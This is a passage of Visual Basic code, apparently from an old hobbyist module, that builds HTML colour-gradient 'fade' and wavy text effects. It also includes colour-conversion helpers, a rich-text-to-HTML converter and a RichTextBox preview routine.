greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))
rednum4% = Val("&H" + Right(dacolor4$, 2))
greennum4% = Val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = Val("&H" + Left(dacolor4$, 2))

FadeByColor4 = FadeFourColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, TheText, Wavy)

End Function
Function FadeByColor5(Colr1, Colr2, Colr3, Colr4, Colr5, TheText$, Wavy As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))
rednum4% = Val("&H" + Right(dacolor4$, 2))
greennum4% = Val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = Val("&H" + Left(dacolor4$, 2))
rednum5% = Val("&H" + Right(dacolor5$, 2))
greennum5% = Val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = Val("&H" + Left(dacolor5$, 2))

FadeByColor5 = FadeFiveColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, TheText, Wavy)

End Function
Function FadeFiveColor(R1%, G1%, b1%, R2%, G2%, b2%, R3%, G3%, b3%, R4%, G4%, b4%, R5%, G5%, B5%, TheText$, Wavy As Boolean)
'by monk-e-god
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    TextLen% = Len(TheText)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    seclen% = seclen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    Loop Until TextLen% < 1
    
    part1$ = Left(TheText, fstlen%)
    part2$ = Mid(TheText, fstlen% + 1, seclen%)
    part3$ = Mid(TheText, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Right(TheText, frthlen%)
    
    'part1
    TextLen% = Len(part1$)
    For i = 1 To TextLen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b2 - b1) / TextLen% * i) + b1, ((G2 - G1) / TextLen% * i) + G1, ((R2 - R1) / TextLen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    'part2
    TextLen% = Len(part2$)
    For i = 1 To TextLen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b3 - b2) / TextLen% * i) + b2, ((G3 - G2) / TextLen% * i) + G2, ((R3 - R2) / TextLen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    'part3
    TextLen% = Len(part3$)
    For i = 1 To TextLen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b4 - b3) / TextLen% * i) + b3, ((G4 - G3) / TextLen% * i) + G3, ((R4 - R3) / TextLen% * i) + R3)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    'part4
    TextLen% = Len(part4$)
    For i = 1 To TextLen%
        TextDone$ = Left(part4$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - b4) / TextLen% * i) + b4, ((G5 - G4) / TextLen% * i) + G4, ((R5 - R4) / TextLen% * i) + R4)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    FadeFiveColor = Faded1$ + Faded2$ + Faded3$ + Faded4$
End Function

Function FadeTenColor(R1%, G1%, b1%, R2%, G2%, b2%, R3%, G3%, b3%, R4%, G4%, b4%, R5%, G5%, B5%, R6%, G6%, B6%, R7%, G7%, B7%, R8%, G8%, B8%, R9%, G9%, B9%, R10%, G10%, B10%, TheText$, Wavy As Boolean)
'by monk-e-god
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    TextLen% = Len(TheText)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    seclen% = seclen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    fithlen% = fithlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    sixlen% = sixlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    seclen% = seclen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    eightlen% = eightlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    ninelen% = ninelen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    Loop Until TextLen% < 1
    
    part1$ = Left(TheText, fstlen%)
    part2$ = Mid(TheText, fstlen% + 1, seclen%)
    part3$ = Mid(TheText, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Mid(TheText, fstlen% + seclen% + thrdlen% + 1, frthlen%)
    part5$ = Mid(TheText, fstlen% + seclen% + thrdlen% + frthlen% + 1, fithlen%)
    part6$ = Mid(TheText, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + 1, sixlen%)
    part7$ = Mid(TheText, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + sixlen% + 1, sevlen%)
    part8$ = Mid(TheText, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + sixlen% + sevlen% + 1, eightlen%)
    part9$ = Right(TheText, ninelen%)
    
    'part1
    TextLen% = Len(part1$)
    For i = 1 To TextLen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b2 - b1) / TextLen% * i) + b1, ((G2 - G1) / TextLen% * i) + G1, ((R2 - R1) / TextLen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    'part2
    TextLen% = Len(part2$)
    For i = 1 To TextLen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b3 - b2) / TextLen% * i) + b2, ((G3 - G2) / TextLen% * i) + G2, ((R3 - R2) / TextLen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part3
    TextLen% = Len(part3$)
    For i = 1 To TextLen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b4 - b3) / TextLen% * i) + b3, ((G4 - G3) / TextLen% * i) + G3, ((R4 - R3) / TextLen% * i) + R3)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part4
    TextLen% = Len(part4$)
    For i = 1 To TextLen%
        TextDone$ = Left(part4$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - b4) / TextLen% * i) + b4, ((G5 - G4) / TextLen% * i) + G4, ((R5 - R4) / TextLen% * i) + R4)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part5
    TextLen% = Len(part5$)
    For i = 1 To TextLen%
        TextDone$ = Left(part5$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B6 - B5) / TextLen% * i) + B5, ((G6 - G5) / TextLen% * i) + G5, ((R6 - R5) / TextLen% * i) + R5)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded5$ = Faded5$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part6
    TextLen% = Len(part6$)
    For i = 1 To TextLen%
        TextDone$ = Left(part6$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B7 - B6) / TextLen% * i) + B6, ((G7 - G6) / TextLen% * i) + G6, ((R7 - R6) / TextLen% * i) + R6)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded6$ = Faded6$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part7
    TextLen% = Len(part7$)
    For i = 1 To TextLen%
        TextDone$ = Left(part7$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B8 - B7) / TextLen% * i) + B7, ((G8 - G7) / TextLen% * i) + G7, ((R8 - R7) / TextLen% * i) + R7)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded7$ = Faded7$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part8
    TextLen% = Len(part8$)
    For i = 1 To TextLen%
        TextDone$ = Left(part8$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B9 - B8) / TextLen% * i) + B8, ((G9 - G8) / TextLen% * i) + G8, ((R9 - R8) / TextLen% * i) + R8)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded8$ = Faded8$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part9
    TextLen% = Len(part9$)
    For i = 1 To TextLen%
        TextDone$ = Left(part9$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B10 - B9) / TextLen% * i) + B9, ((G10 - G9) / TextLen% * i) + G9, ((R10 - R9) / TextLen% * i) + R9)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded9$ = Faded9$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    FadeTenColor = Faded1$ + Faded2$ + Faded3$ + Faded4$ + Faded5$ + Faded6$ + Faded7$ + Faded8$ + Faded9$
End Function


Function InverseColor(OldColor)
'by monk-e-god
dacolor$ = RGBtoHEX(OldColor)
RedX% = Val("&H" + Right(dacolor$, 2))
GreenX% = Val("&H" + Mid(dacolor$, 3, 2))
BlueX% = Val("&H" + Left(dacolor$, 2))
newred% = 255 - RedX%
newgreen% = 255 - GreenX%
newblue% = 255 - BlueX%
InverseColor = RGB(newred%, newgreen%, newblue%)

End Function

Function MultiFade(NumColors%, TheColors(), TheText$, Wavy As Boolean)
'by monk-e-god
Dim WaveState%
Dim WaveHTML$
WaveState = 0

If NumColors < 1 Then
MsgBox "Error: Attempting to fade less than one color."
MultiFade = TheText
Exit Function
End If

If NumColors = 1 Then
blah$ = RGBtoHEX(TheColors(1))
redpart% = Val("&H" + Right(blah$, 2))
greenpart% = Val("&H" + Mid(blah$, 3, 2))
bluepart% = Val("&H" + Left(blah$, 2))
blah2 = RGB(bluepart%, greenpart%, redpart%)
blah3$ = RGBtoHEX(blah2)

MultiFade = "<Font Color=#" + blah3$ + ">" + TheText
Exit Function
End If

Dim RedList%()
Dim GreenList%()
Dim BlueList%()
Dim DaColors$()
Dim DaLens%()
Dim DaParts$()
Dim Faded$()

ReDim RedList%(NumColors)
ReDim GreenList%(NumColors)
ReDim BlueList%(NumColors)
ReDim DaColors$(NumColors)
ReDim DaLens%(NumColors - 1)
ReDim DaParts$(NumColors - 1)
ReDim Faded$(NumColors - 1)

For q% = 1 To NumColors
DaColors(q%) = RGBtoHEX(TheColors(q%))
Next q%

For w% = 1 To NumColors
RedList(w%) = Val("&H" + Right(DaColors(w%), 2))
GreenList(w%) = Val("&H" + Mid(DaColors(w%), 3, 2))
BlueList(w%) = Val("&H" + Left(DaColors(w%), 2))
Next w%

TextLen% = Len(TheText)
Do: DoEvents
For f% = 1 To (NumColors - 1)
DaLens(f%) = DaLens(f%) + 1: TextLen% = TextLen% - 1
If TextLen% < 1 Then Exit For
Next f%
Loop Until TextLen% < 1
    
DaParts(1) = Left(TheText, DaLens(1))
DaParts(NumColors - 1) = Right(TheText, DaLens(NumColors - 1))
    
dastart% = DaLens(1) + 1

If NumColors > 2 Then
For e% = 2 To NumColors - 2
DaParts(e%) = Mid(TheText, dastart%, DaLens(e%))
dastart% = dastart% + DaLens(e%)
Next e%
End If

For r% = 1 To (NumColors - 1)
TextLen% = Len(DaParts(r%))
For i = 1 To TextLen%
    TextDone$ = Left(DaParts(r%), i)
    LastChr$ = Right(TextDone$, 1)
    colorx = RGB(((BlueList(r% + 1) - BlueList(r%)) / TextLen% * i) + BlueList(r%), ((GreenList%(r% + 1) - GreenList(r%)) / TextLen% * i) + GreenList(r%), ((RedList(r% + 1) - RedList(r%)) / TextLen% * i) + RedList(r%))
    colorx2 = RGBtoHEX(colorx)
        
    If Wavy = True Then
    WaveState = WaveState + 1
    If WaveState > 4 Then WaveState = 1
    If WaveState = 1 Then WaveHTML = "<sup>"
    If WaveState = 2 Then WaveHTML = "</sup>"
    If WaveState = 3 Then WaveHTML = "<sub>"
    If WaveState = 4 Then WaveHTML = "</sub>"
    Else
    WaveHTML = ""
    End If
        
    Faded(r%) = Faded(r%) + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
Next i
Next r%

For qwe% = 1 To (NumColors - 1)
FadedTxtX$ = FadedTxtX$ + Faded(qwe%)
Next qwe%

MultiFade = FadedTxtX$

End Function

Function Replacer(TheStr As String, This As String, WithThis As String)
'by monk-e-god
Dim STRwo13s As String
STRwo13s = TheStr
Do While InStr(1, STRwo13s, This)
DoEvents
thepos% = InStr(1, STRwo13s, This)
STRwo13s = Left(STRwo13s, (thepos% - 1)) + WithThis + Right(STRwo13s, Len(STRwo13s) - (thepos% + Len(This) - 1))
Loop

Replacer = STRwo13s
End Function
Function RGBtoHEX(RGB)
    a$ = Hex(RGB)
    b% = Len(a$)
    If b% = 5 Then a$ = "0" & a$
    If b% = 4 Then a$ = "00" & a$
    If b% = 3 Then a$ = "000" & a$
    If b% = 2 Then a$ = "0000" & a$
    If b% = 1 Then a$ = "00000" & a$
    RGBtoHEX = a$
End Function

Function Rich2HTML(RichTXT As Control, StartPos%, EndPos%)
'by monk-e-god
Dim Bolded As Boolean
Dim Undered As Boolean
Dim Striked As Boolean
Dim Italiced As Boolean
Dim LastCRL As Long
Dim LastFont As String
Dim HTMLString As String

For posi% = StartPos To EndPos
RichTXT.SelStart = posi%
RichTXT.SelLength = 1

If Bolded <> RichTXT.SelBold Or posi% = StartPos Then
If RichTXT.SelBold = True Then
HTMLString = HTMLString + "<b>"
Bolded = True
Else
HTMLString = HTMLString + "</b>"
Bolded = False
End If
End If

If Undered <> RichTXT.SelUnderline Or posi% = StartPos Then
If RichTXT.SelUnderline = True Then
HTMLString = HTMLString + "<u>"
Undered = True
Else
HTMLString = HTMLString + "</u>"
Undered = False
End If
End If

If Striked <> RichTXT.SelStrikeThru Or posi% = StartPos Then
If RichTXT.SelStrikeThru = True Then
HTMLString = HTMLString + "<s>"
Striked = True
Else
HTMLString = HTMLString + "</s>"
Striked = False
End If
End If

If Italiced <> RichTXT.SelItalic Or posi% = StartPos Then
If RichTXT.SelItalic = True Then
HTMLString = HTMLString + "<i>"
Italiced = True
Else
HTMLString = HTMLString + "</i>"
Italiced = False
End If
End If

If LastCRL <> RichTXT.SelColor Or posi% = StartPos Then
colorx = RGB(GetRGB(RichTXT.SelColor).blue, GetRGB(RichTXT.SelColor).green, GetRGB(RichTXT.SelColor).red)
colorhex = RGBtoHEX(colorx)
HTMLString = HTMLString + "<Font Color=#" & colorhex & ">"
LastCRL = RichTXT.SelColor
End If

If LastFont <> RichTXT.SelFontName Then
HTMLString = HTMLString + "<font face=" + Chr(34) + RichTXT.SelFontName + Chr(34) + ">"
LastFont = RichTXT.SelFontName
End If

HTMLString = HTMLString + RichTXT.SelText
Next posi%

Rich2HTML = HTMLString

End Function


Function HTMLtoRGB(TheHTML$)

If Left(TheHTML$, 1) = "#" Then TheHTML$ = Right(TheHTML$, 6)

RedX$ = Left(TheHTML$, 2)
GreenX$ = Mid(TheHTML$, 3, 2)
BlueX$ = Right(TheHTML$, 2)
rgbhex$ = "&H00" + BlueX$ + GreenX$ + RedX$ + "&"
HTMLtoRGB = Val(rgbhex$)
End Function

Function FadeFourColor(R1%, G1%, b1%, R2%, G2%, b2%, R3%, G3%, b3%, R4%, G4%, b4%, TheText$, Wavy As Boolean)
'by monk-e-god
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    TextLen% = Len(TheText)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    seclen% = seclen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    Loop Until TextLen% < 1
    
    part1$ = Left(TheText, fstlen%)
    part2$ = Mid(TheText, fstlen% + 1, seclen%)
    part3$ = Right(TheText, thrdlen%)
    
    'part1
    TextLen% = Len(part1$)
    For i = 1 To TextLen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b2 - b1) / TextLen% * i) + b1, ((G2 - G1) / TextLen% * i) + G1, ((R2 - R1) / TextLen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    'part2
    TextLen% = Len(part2$)
    For i = 1 To TextLen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b3 - b2) / TextLen% * i) + b2, ((G3 - G2) / TextLen% * i) + G2, ((R3 - R2) / TextLen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    'part3
    TextLen% = Len(part3$)
    For i = 1 To TextLen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b4 - b3) / TextLen% * i) + b3, ((G4 - G3) / TextLen% * i) + G3, ((R4 - R3) / TextLen% * i) + R3)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    FadeFourColor = Faded1$ + Faded2$ + Faded3$
End Function

Function FadeThreeColor(R1%, G1%, b1%, R2%, G2%, b2%, R3%, G3%, b3%, TheText$, Wavy As Boolean)
'by monk-e-god
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    TextLen% = Len(TheText)
    fstlen% = (Int(TextLen%) / 2)
    part1$ = Left(TheText, fstlen%)
    part2$ = Right(TheText, TextLen% - fstlen%)
    'part1
    TextLen% = Len(part1$)
    For i = 1 To TextLen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b2 - b1) / TextLen% * i) + b1, ((G2 - G1) / TextLen% * i) + G1, ((R2 - R1) / TextLen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    'part2
    TextLen% = Len(part2$)
    For i = 1 To TextLen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b3 - b2) / TextLen% * i) + b2, ((G3 - G2) / TextLen% * i) + G2, ((R3 - R2) / TextLen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    
    FadeThreeColor = Faded1$ + Faded2$
End Function

Function FadeTwoColor(R1%, G1%, b1%, R2%, G2%, b2%, TheText$, Wavy As Boolean)
'by monk-e-god
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    TextLen$ = Len(TheText)
    For i = 1 To TextLen$
        TextDone$ = Left(TheText, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b2 - b1) / TextLen$ * i) + b1, ((G2 - G1) / TextLen$ * i) + G1, ((R2 - R1) / TextLen$ * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded$ = Faded$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    FadeTwoColor = Faded$
End Function
Function Hex2Dec!(ByVal strHex$)
  If Len(strHex$) > 8 Then strHex$ = Right$(strHex$, 8)
  Hex2Dec = 0
  For X = Len(strHex$) To 1 Step -1
    CurCharVal = GETVAL(Mid$(UCase$(strHex$), X, 1))
    Hex2Dec = Hex2Dec + CurCharVal * 16 ^ (Len(strHex$) - X)
  Next X
End Function

Sub FadePreview2(RichTB As Control, ByVal FadedText As String)
'Modified by monk-e-god for use in a RichTextBox

'NOTE: RichTB must be a RichTextBox.
'NOTE: You cannot preview wavy fades with this sub.
Dim StartPlace%
StartPlace% = 0
RichTB.SelStart = StartPlace%
RichTB.SelBold = False: RichTB.SelItalic = False: RichTB.SelUnderline = False: RichTB.SelStrikeThru = False
RichTB.SelColor = 0&: RichTB.Text = ""
For X = 1 To Len(FadedText$)
  c$ = Mid$(FadedText$, X, 1)
  RichTB.SelStart = StartPlace%
  RichTB.SelLength = 1
  If c$ = "<" Then
    TagStart = X + 1
    TagEnd = InStr(X + 1, FadedText$, ">") - 1
    t$ = LCase$(Mid$(FadedText$, TagStart, (TagEnd - TagStart) + 1))
    X = TagEnd + 1
    RichTB.SelStart = StartPlace%
    RichTB.SelLength = 1
    Select Case t$
      Case "u"
        RichTB.SelUnderline = True
      Case "/u"
        RichTB.SelUnderline = False
      Case "s"
        RichTB.SelStrikeThru = True
      Case "/s"
        RichTB.SelStrikeThru = False
      Case "b"    'start bold
        RichTB.SelBold = True
      Case "/b"   'stop bold
        RichTB.SelBold = False
      Case "i"    'start italic
        RichTB.SelItalic = True
      Case "/i"   'stop italic
